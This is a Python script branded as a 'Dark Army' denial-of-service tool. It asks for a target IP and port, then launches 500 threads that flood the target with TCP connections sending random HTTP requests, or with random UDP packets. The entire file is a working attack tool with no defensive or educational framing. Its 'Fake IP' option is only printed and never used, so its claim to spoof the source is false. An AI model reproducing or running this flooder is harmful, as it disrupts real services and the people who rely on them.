# -- coding: utf-8 --

import socket
import threading
import random
import string
import time
import os
from colorama import Fore, Style, init

init()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

banner = r"""
               ██████╗        █████╗ ██████╗ ███╗   ███╗██╗   ██╗
               ██╔══██╗      ██╔══██╗██╔══██╗████╗ ████║╚██╗ ██╔╝
               ██║  ██║█████╗███████║██████╔╝██╔████╔██║ ╚████╔╝
               ██╔══██║╚════╝██╔══██║██╔══██╗██║╚██╔╝██║  ╚██╔╝
               ██████╔╝      ██║  ██║██║  ██║██║ ╚═╝ ██║   ██║
               ╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝   ╚═╝
                   Distributed Denial of Service (DoS) Tool
                            Designed by Dark Army
"""

clear_screen()
print(Fore.MAGENTA + banner + Style.RESET_ALL)

target_ip = input(Fore.CYAN + "( § ) Target IP: " + Style.RESET_ALL)
target_port = int(input(Fore.CYAN + "( § ) Target PORT: " + Style.RESET_ALL))
fake_ip = input(Fore.CYAN + "( § ) Fake IP: " + Style.RESET_ALL)
protocol = input(Fore.CYAN + "( § ) Choose Protocol (TCP/UDP): " + Style.RESET_ALL).upper()
num_packets = int(input(Fore.CYAN + "( § ) Number of packets to send: " + Style.RESET_ALL))
packet_size = int(input(Fore.CYAN + "( § ) Size of each packet (bytes): " + Style.RESET_ALL))
delay = float(input(Fore.CYAN + "( § ) Delay between packets (seconds): " + Style.RESET_ALL))

def random_data(length):
    letters = string.ascii_letters + string.digits
    return ''.join(random.choice(letters) for i in range(length))

def attack_tcp():
    sent_packets = 0
    while sent_packets < num_packets:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))
            request = f"GET /{random_data(10)} HTTP/1.1\r\nHost: {random_data(5)}.com\r\n\r\n"
            s.send(request.encode('ascii'))
            sent_packets += 1
            print(Fore.GREEN + f"( § ) {sent_packets} - {num_packets} : {target_ip}:{target_port} - Fake IP: {fake_ip}" + Style.RESET_ALL)

            if sent_packets % 1000 == 0:
                print(Fore.YELLOW + f"( § ) Sent {sent_packets} packets so far." + Style.RESET_ALL)

            time.sleep(delay)

        except Exception as e:
            print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
        finally:
            s.close()

def attack_udp():
    sent_packets = 0
    while sent_packets < num_packets:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            packet_data = random_data(packet_size)
            s.sendto(packet_data.encode('ascii'), (target_ip, target_port))
            sent_packets += 1
            print(Fore.GREEN + f"( § ) {sent_packets} - {num_packets} : {target_ip}:{target_port} - Fake IP: {fake_ip}" + Style.RESET_ALL)

            if sent_packets % 1000 == 0:
                print(Fore.YELLOW + f"( § ) Sent {sent_packets} packets so far." + Style.RESET_ALL)

            time.sleep(delay)

        except Exception as e:
            print(Fore.RED + f"Error: {e}" + Style.RESET_ALL)
        finally:
            s.close()

def start_attack():
    if protocol == "TCP":
        for i in range(500):
            thread = threading.Thread(target=attack_tcp)
            thread.start()
    elif protocol == "UDP":
        for i in range(500):
            thread = threading.Thread(target=attack_udp)
            thread.start()
    else:
        print(Fore.RED + "( § ) Invalid protocol! Please choose either TCP or UDP." + Style.RESET_ALL)

start_attack()
